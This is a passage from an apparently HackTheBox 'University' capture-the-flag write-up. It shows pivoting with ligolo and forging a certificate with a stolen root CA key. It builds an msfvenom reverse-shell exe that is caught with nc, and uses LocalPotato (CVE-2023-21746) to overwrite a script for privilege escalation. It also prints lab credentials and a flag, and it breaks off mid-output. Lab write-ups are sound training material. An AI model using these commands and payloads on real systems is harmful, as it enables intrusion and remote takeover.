<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Web\DB Backups&gt; ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter vEthernet (Internal-VSwitch1):</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   Link-<span class="built_in">local</span> IPv6 Address . . . . . : fe80::47c0:fbc9:2d7b:e4bb%6</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.99.1</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : </span><br><span class="line"></span><br><span class="line">Ethernet adapter Ethernet0 2:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   IPv6 Address. . . . . . . . . . . : dead:beef::ae73:e115:1e52:ef66</span><br><span class="line">   Link-<span class="built_in">local</span> IPv6 Address . . . . . : fe80::fb43:a91c:6cf:36a0%4</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.10.11.39</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.254.0</span><br><span class="line">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:247e%4</span><br><span class="line">                                       10.10.10.2</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>So I’ll setup ligolo and connect to that internal network.</p>
<p>Commands to setup the tunnel after running <code>./proxy --self-cert</code> on the attacker machine and <code>.\agent.exe -connect 10.10.16.19:11601 -ignore-cert</code> on the victim:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ip tuntap add user kali mode tun ligolo</span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> ligolo up</span><br><span class="line">sudo ip route add 192.168.99.0/24 dev ligolo</span><br></pre></td></tr></table></figure></div>

<p>Running nmap we can discover two hosts:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -T4 192.168.99.2   </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 07:50 EDT</span><br><span class="line">Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 14.10% <span class="keyword">done</span>; ETC: 07:51 (0:00:43 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.99.2</span><br><span class="line">Host is up (0.065s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">5985/tcp open  wsman</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ nmap -T4 192.168.99.12</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 07:51 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.99.12</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 999 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>We now check our user’s access on them:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ nxc winrm 192.168.99.2 -u wao -p WebAO1337          </span><br><span class="line">WINRM       192.168.99.2    5985   WS-3             [*] Windows 10 / Server 2019 Build 17763 (name:WS-3) (domain:university.htb)</span><br><span class="line">WINRM       192.168.99.2    5985   WS-3             [+] university.htb\wao:WebAO1337 (Pwn3d!)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>And indeed we can connect with winrm on 192.168.99.2:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 192.168.99.2 -u wao -p <span class="string">&#x27;WebAO1337&#x27;</span>          </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\wao\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">university\wao</span><br><span class="line">*Evil-WinRM* PS C:\Users\wao\Documents&gt; hostname</span><br><span class="line">WS-3</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>The host we are on now is WS-3.</p>
<p>Now checking our user’s desktop we find an interesting note:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\wao\desktop&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\wao\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        3/13/2024  11:27 AM            532 README.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\wao\desktop&gt; <span class="built_in">cat</span> README.txt</span><br><span class="line">Hello Professors.</span><br><span class="line">We have created this note <span class="keyword">for</span> all the <span class="built_in">users</span> on the domain computers: WS-1, WS-2 and WS-3.</span><br><span class="line">These computers have not been updated since 10/29/2023.</span><br><span class="line">Since these devices are used <span class="keyword">for</span> content evaluation purposes, they should always have the latest security updates.</span><br><span class="line">So please be sure to complete your current assessments and move on to the computers <span class="string">&quot;WS-4&quot;</span> and <span class="string">&quot;WS-5&quot;</span>.</span><br><span class="line">The security team will begin working on the updates and applying new security policies early next month.</span><br><span class="line">Best regards.</span><br><span class="line">Help Desk team - Rose Lanosta.</span><br><span class="line">*Evil-WinRM* PS C:\Users\wao\desktop&gt; </span><br></pre></td></tr></table></figure></div>

<p>Now I’ll go onto the linux machine:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ ssh wao@192.168.99.12                       </span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.99.12 (192.168.99.12)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:z8L0+f0YSMRypoPvBj1IMW944a9RwwJXiKkrXdvipy4.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.99.12<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">--------------------------[!]WARNING[!]-----------------------------</span></span><br><span class="line"><span class="string">|This LAB is created for web app features testing purposes ONLY....|</span></span><br><span class="line"><span class="string">|Please DO NOT leave any critical information while this machine is|</span></span><br><span class="line"><span class="string">|       accessible by all the &quot;Web Developers&quot; as sudo users       |</span></span><br><span class="line"><span class="string">--------------------------------------------------------------------</span></span><br><span class="line"><span class="string">wao@192.168.99.12&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line">Last login: Mon Oct 21 17:11:58 2024 from 192.168.99.1</span><br><span class="line">wao@LAB-2:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(wao) gid=1001(wao) <span class="built_in">groups</span>=1001(wao),27(sudo)</span><br><span class="line">wao@LAB-2:~$</span><br></pre></td></tr></table></figure></div>

<p>Directly we can see that we can execute anything as sudo so we become root:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wao@LAB-2:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> wao: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> wao on LAB-2:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User wao may run the following commands on LAB-2:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">wao@LAB-2:~$ sudo su</span><br><span class="line">root@LAB-2:/home/wao<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@LAB-2:/home/wao<span class="comment"># </span></span><br></pre></td></tr></table></figure></div>


<p>Now looking back at the initial login page, there was an option to login with a signed certificate, and on the DC machine we can find some root certificates:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Web\University\CA&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Web\University\CA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">-a----        2/15/2024   5:51 AM           1399 rootCA.crt                                                            </span><br><span class="line">-a----        2/15/2024   5:48 AM           1704 rootCA.key                                                            </span><br><span class="line">-a----        2/25/2024   5:41 PM             42 rootCA.srl                                                            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Web\University\CA&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>So we can use them to sign a professor’s cert and login with them and see what we can do.<br>Looking at bloodhound, there is a group called CONTENT EVALATORS, which are most probably the professors, we’ll abuse Geroge here:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/University/blood.png"
                      alt="Bloodhound"
                ><figcaption>Bloodhound</figcaption></figure></p>
<p>First I’ll request a key and cert for him:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ openssl req -newkey rsa:2048 -keyout PK_george.key -out george-CSR.csr</span><br><span class="line">...+......+.+........+....+.....+.+...........+.............+++++++++++++++++++++++++++++++++++++++*....+.....+......+...+.+.....+....+..+..........+..+...+............+.............+..+............+...+......+.......+..+.+++++++++++++++++++++++++++++++++++++++*......+.+..............+.+.......................+....+..+..........+...+.....+......+...............+.+...+.....................+......+......+..+.............+...+..............+.+..+....+.....+....+..+....+...+......+.........+..+...+......+.+......++++++</span><br><span class="line">..+....+...+........+.+.....+......+++++++++++++++++++++++++++++++++++++++*..................+..+............+......+.+...+...+...+.........+..+......+.........+....+......+........+...+..........+..+.+..............+...+++++++++++++++++++++++++++++++++++++++*...+....+..+......+.......+........+.......+........+.......+...+..+.+............+........+.+.....+......+...+......+......+...+.........................+......+...............+.........+.....+.+.....+....+...........+.+.........+...+...............++++++</span><br><span class="line">Enter PEM pass phrase:</span><br><span class="line">Verifying - Enter PEM pass phrase:</span><br><span class="line">-----</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter <span class="string">&#x27;.&#x27;</span>, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:</span><br><span class="line">State or Province Name (full name) [Some-State]:</span><br><span class="line">Locality Name (eg, city) []:</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:</span><br><span class="line">Organizational Unit Name (eg, section) []:</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:george</span><br><span class="line">Email Address []:george@university.htb</span><br><span class="line"></span><br><span class="line">Please enter the following <span class="string">&#x27;extra&#x27;</span> attributes</span><br><span class="line">to be sent with your certificate request</span><br><span class="line">A challenge password []:george</span><br><span class="line">An optional company name []:</span><br></pre></td></tr></table></figure></div>


<p>Now sign it with the rootCA:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ openssl x509 -req -<span class="keyword">in</span> george-CSR.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial &gt; george.pem</span><br><span class="line">Certificate request self-signature ok</span><br><span class="line">subject=C=AU, ST=Some-State, O=Internet Widgits Pty Ltd</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And we are in:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/University/web2.png"
                      alt="Login as george"
                ><figcaption>Login as george</figcaption></figure></p>
<p>We can find an Add a new lecture option under “Manage Cources”. We can find the instructions to add a new course:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/University/web3.png"
                      alt="Add a lecture"
                ><figcaption>Add a lecture</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/University/web4.png"
                      alt="Add a lecture"
                ><figcaption>Add a lecture</figcaption></figure></p>
<p>Maybe we can get a reverse shell if the URL in the url file is pointing to our reverse shell?<br>First, we establish the public key:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ gpg --gen-key</span><br><span class="line">gpg (GnuPG) 2.2.45; Copyright (C) 2024 g10 Code GmbH</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line"></span><br><span class="line">Note: Use <span class="string">&quot;gpg --full-generate-key&quot;</span> <span class="keyword">for</span> a full featured key generation dialog.</span><br><span class="line"></span><br><span class="line">GnuPG needs to construct a user ID to identify your key.</span><br><span class="line"></span><br><span class="line">Real name: george</span><br><span class="line">Email address: george@university.htb</span><br><span class="line">You selected this USER-ID:</span><br><span class="line">    <span class="string">&quot;george &lt;george@university.htb&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">Change (N)ame, (E)mail, or (O)kay/(Q)uit? O</span><br><span class="line">We need to generate a lot of random bytes. It is a good idea to perform</span><br><span class="line">some other action (<span class="built_in">type</span> on the keyboard, move the mouse, utilize the</span><br><span class="line">disks) during the prime generation; this gives the random number</span><br><span class="line">generator a better chance to gain enough entropy.</span><br><span class="line">We need to generate a lot of random bytes. It is a good idea to perform</span><br><span class="line">some other action (<span class="built_in">type</span> on the keyboard, move the mouse, utilize the</span><br><span class="line">disks) during the prime generation; this gives the random number</span><br><span class="line">generator a better chance to gain enough entropy.</span><br><span class="line">gpg: directory <span class="string">&#x27;/home/kali/.gnupg/openpgp-revocs.d&#x27;</span> created</span><br><span class="line">gpg: revocation certificate stored as <span class="string">&#x27;/home/kali/.gnupg/openpgp-revocs.d/9FD9816C5D80B6618FB66A302F730A905BA63813.rev&#x27;</span></span><br><span class="line">public and secret key created and signed.</span><br><span class="line"></span><br><span class="line">pub   rsa3072 2025-07-30 [SC] [expires: 2028-07-29]</span><br><span class="line">      9FD9816C5D80B6618FB66A302F730A905BA63813</span><br><span class="line">uid                      george &lt;george@university.htb&gt;</span><br><span class="line">sub   rsa3072 2025-07-30 [E] [expires: 2028-07-29]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ gpg --<span class="built_in">export</span> -a <span class="string">&quot;george&quot;</span> &gt; gpg.key</span><br></pre></td></tr></table></figure></div>



<p>Now I’ll create a url file, point it to my reverse shell and zip it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> Reference-1.url                                   </span><br><span class="line">[InternetShortcut]</span><br><span class="line">URL=file://C:/Users/WAO/Documents/revshell.exe</span><br><span class="line">IDList=</span><br></pre></td></tr></table></figure></div>

<p>Now zip it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ 7z u revshell.zip Reference-1.url</span><br><span class="line"></span><br><span class="line">7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11</span><br><span class="line"> 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024</span><br><span class="line"></span><br><span class="line">Scanning the drive:</span><br><span class="line">1 file, 74 bytes (1 KiB)</span><br><span class="line"></span><br><span class="line">Creating archive: revshell.zip</span><br><span class="line"></span><br><span class="line">Add new data to archive: 1 file, 74 bytes (1 KiB)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">Files <span class="built_in">read</span> from disk: 1</span><br><span class="line">Archive size: 238 bytes (1 KiB)</span><br><span class="line">Everything is Ok</span><br><span class="line">                                                                                      </span><br><span class="line">(base) ┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ gpg --detach-sign -u george revshell.zip </span><br></pre></td></tr></table></figure></div>

<p>Now I’ll create my payload:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.99.12 LPORT=4444 -f exe &gt; revshell.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 324 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Now before uploading the file, we must first upload the public key onto the platform from here: <a class="link"   target="_blank" rel="noopener" href="http://university.htb/accounts/upload_PubKEY/" >http://university.htb/accounts/upload_PubKEY/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Now we’ll get a successful upload.</p>
<p>And after a few seconds I get a callback as martin:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wao@LAB-2:~$ nc -lvnp 4444</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 4444)</span><br><span class="line">Connection from 192.168.99.2 59758 received!</span><br><span class="line">Microsoft Windows [Version 10.0.17763.3650]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">university\martin.t</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure></div>

<p>And we can get user flag from him:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PS C:\<span class="built_in">users</span>\martin.t\desktop&gt; <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="built_in">users</span>\martin.t\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">d-----        7/31/2025   2:43 PM                Lecture                                                               </span><br><span class="line">-a----        3/13/2024  11:27 AM            532 README.txt                                                            </span><br><span class="line">-a----        7/31/2025   4:05 AM             34 user.txt                                                              </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\<span class="built_in">users</span>\martin.t\desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">be4d1d1b0542b4c6ae85354ec3eb548c</span><br><span class="line">PS C:\<span class="built_in">users</span>\martin.t\desktop&gt; </span><br></pre></td></tr></table></figure></div>

<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Now it has been mentioned previously that the box has not been patched for a long time.<br>We can use wmic to check the updates:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\<span class="built_in">users</span>\martin.t\desktop&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">Caption                                     Description      HotFixID   InstalledOn  </span><br><span class="line">http://support.microsoft.com/?kbid=5020627  Update           KB5020627  11/5/2022    </span><br><span class="line">https://support.microsoft.com/help/5019966  Security Update  KB5019966  11/5/2022    </span><br><span class="line">                                            Security Update  KB5020374  11/5/2022</span><br></pre></td></tr></table></figure></div>



<p>For this we can use <a class="link"   target="_blank" rel="noopener" href="https://github.com/decoder-it/LocalPotato" >LocalPotato <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Now I’ll replace a powershell script that’s on the automation script folder with my reverse shell script:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS C:\temp&gt; ./LocalPotato.exe -i r.ps1 -o <span class="string">&quot;\Program Files\Automation-Scripts\wpad-cache-cleaner.ps1&quot;</span></span><br><span class="line">./LocalPotato.exe -i r.ps1 -o <span class="string">&quot;\Program Files\Automation-Scripts\wpad-cache-cleaner.ps1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         LocalPotato (aka CVE-2023-21746 &amp; HTTP/WebDAV) </span><br><span class="line">         by splinter_code &amp; decoder_it</span><br><span class="line"></span><br><span class="line">[*] Objref Moniker Display Name = objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGAQAAAAAAAABY2JVFA1OhKias9gBDii9PAZQAAEgEQA5QR7qRURVFIysAFQAHAFcAUwAtADMAAAAHADEAOQAyAC4AMQA2ADgALgA5ADkALgAyAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:</span><br><span class="line">[*] Calling CoGetInstanceFromIStorage with CLSID:&#123;854A20FB-2D44-457D-992F-EF13785D2B51&#125;</span><br><span class="line">[*] Marshalling the IStorage object... IStorageTrigger written: 100 bytes</span><br><span class="line">[*] Received DCOM NTLM <span 